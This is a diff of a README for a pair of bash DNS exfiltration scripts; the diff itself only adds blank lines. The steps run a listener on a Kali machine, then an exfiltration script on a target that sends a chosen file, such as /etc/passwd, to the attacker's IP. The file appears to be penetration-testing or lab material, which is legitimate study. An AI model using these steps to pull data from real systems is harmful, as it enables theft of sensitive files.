@@ -12,11 +12,14 @@ tcpdump, dig, base64 (pre-installed on most Linux)
 1. On Kali (Listener)
 
 sudo ./bash-DNS-listener.sh
+
 Wait for data, then press Ctrl+C to decode
 2. On Target (Exfiltration)
 
 ./bash-DNS-exfil.sh
+
 Enter file path (e.g., /etc/passwd)
+
 Enter Kali IP address
 3. Check Results
 Decoded data saved to exfiltrated_data.txt on Kali machine.
